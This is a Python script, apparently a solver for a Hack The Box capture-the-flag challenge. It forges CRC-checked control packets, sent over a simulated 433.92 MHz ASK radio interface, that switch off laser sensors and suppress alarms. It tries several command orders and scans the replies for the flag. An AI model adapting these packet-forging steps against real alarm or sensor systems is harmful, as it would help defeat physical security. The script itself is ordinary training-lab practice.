#!/usr/bin/env python3
import requests
import struct
import time
import re

def crc16(data, poly=0x1D0F):
    crc = 0x0000
    for byte in data:
        crc ^= (byte << 8)
        for _ in range(8):
            if crc & 0x8000:
                crc = ((crc << 1) ^ poly) & 0xFFFF
            else:
                crc = (crc << 1) & 0xFFFF
    return crc

base_url = 'http://94.237.53.81:59575'

# INNOVACIÓN: Probar comandos Move para los láseres primero
print("[*] INNOVACIÓN 1: Usar comandos Move para desactivar láseres")
s = requests.Session()
s.get(base_url)

# Enviar Move Left y Move Right a los láseres para confundirlos
for addr in [0xE1, 0xE2, 0xE3]:
    for cmd in [0x91, 0x53]:  # Move left, Move right
        data = bytes([addr, cmd])
        crc = crc16(data)
        packet = (data + struct.pack('<H', crc)).hex().upper()
        print(f"  Enviando Move a E{addr & 0x0F}: {packet}")
        s.post(f'{base_url}/transmit', data={'freq': '433.92', 'mod': 'ASK', 'bits': '1', 'msg': packet})
        time.sleep(0.1)

time.sleep(2)
r = s.get(base_url)
if re.findall(r'HTB\{[^}]+\}', r.text):
    print("[SUCCESS]", re.findall(r'HTB\{[^}]+\}', r.text))
else:
    print("[-] No flag con Move")

# INNOVACIÓN 2: Usar comando Alert (0xA0) a las alarmas
print("\n[*] INNOVACIÓN 2: Enviar Alert a alarmas antes de Suppress")
s = requests.Session()
s.get(base_url)

for addr in [0xA1, 0xA2, 0xA3, 0xA4]:
    data = bytes([addr, 0xA0])  # Alert
    crc = crc16(data)
    packet = (data + struct.pack('<H', crc)).hex().upper()
    s.post(f'{base_url}/transmit', data={'freq': '433.92', 'mod': 'ASK', 'bits': '1', 'msg': packet})
    time.sleep(0.05)

time.sleep(1)

# Luego suppress
for addr in [0xA1, 0xA2, 0xA3, 0xA4]:
    data = bytes([addr, 0xF1])
    crc = crc16(data)
    packet = (data + struct.pack('<H', crc)).hex().upper()
    s.post(f'{base_url}/transmit', data={'freq': '433.92', 'mod': 'ASK', 'bits': '1', 'msg': packet})
    time.sleep(0.05)

# Turn off láseres
for addr in [0xE1, 0xE2, 0xE3]:
    data = bytes([addr, 0xFF])
    crc = crc16(data)
    packet = (data + struct.pack('<H', crc)).hex().upper()
    s.post(f'{base_url}/transmit', data={'freq': '433.92', 'mod': 'ASK', 'bits': '1', 'msg': packet})
    time.sleep(0.05)

time.sleep(2)
r = s.get(base_url)
if re.findall(r'HTB\{[^}]+\}', r.text):
    print("[SUCCESS]", re.findall(r'HTB\{[^}]+\}', r.text))
else:
    print("[-] No flag con Alert+Suppress")

# INNOVACIÓN 3: Usar Broadcast (0x03)
print("\n[*] INNOVACIÓN 3: Enviar Broadcast a todos los dispositivos")
s = requests.Session()
s.get(base_url)

data = bytes([0x03])  # Broadcast
crc = crc16(data)
packet = (data + struct.pack('<H', crc)).hex().upper()
# Enviar múltiples broadcasts
for _ in range(10):
    s.post(f'{base_url}/transmit', data={'freq': '433.92', 'mod': 'ASK', 'bits': '1', 'msg': packet})
    time.sleep(0.05)

time.sleep(2)
r = s.get(base_url)
if re.findall(r'HTB\{[^}]+\}', r.text):
    print("[SUCCESS]", re.findall(r'HTB\{[^}]+\}', r.text))
else:
    print("[-] No flag con Broadcast")

# INNOVACIÓN 4: Invertir orden - apagar láseres PRIMERO
print("\n[*] INNOVACIÓN 4: Turn Off láseres ANTES de Suppress alarmas")
s = requests.Session()
s.get(base_url)

# Primero turn off
for addr in [0xE1, 0xE2, 0xE3]:
    data = bytes([addr, 0xFF])
    crc = crc16(data)
    packet = (data + struct.pack('<H', crc)).hex().upper()
    s.post(f'{base_url}/transmit', data={'freq': '433.92', 'mod': 'ASK', 'bits': '1', 'msg': packet})
    time.sleep(0.1)

time.sleep(1)

# Luego suppress
for addr in [0xA1, 0xA2, 0xA3, 0xA4]:
    data = bytes([addr, 0xF1])
    crc = crc16(data)
    packet = (data + struct.pack('<H', crc)).hex().upper()
    s.post(f'{base_url}/transmit', data={'freq': '433.92', 'mod': 'ASK', 'bits': '1', 'msg': packet})
    time.sleep(0.1)

time.sleep(2)
r = s.get(base_url)
flags = re.findall(r'HTB\{[^}]+\}', r.text)
if flags:
    print("[SUCCESS]", flags)
else:
    print("[-] No flag invirtiendo orden")
    # Revisar updates
    r = s.get(f'{base_url}/updates')
    if 'HTB{' in r.text:
        print("[SUCCESS IN UPDATES]", re.findall(r'HTB\{[^}]+\}', r.text))
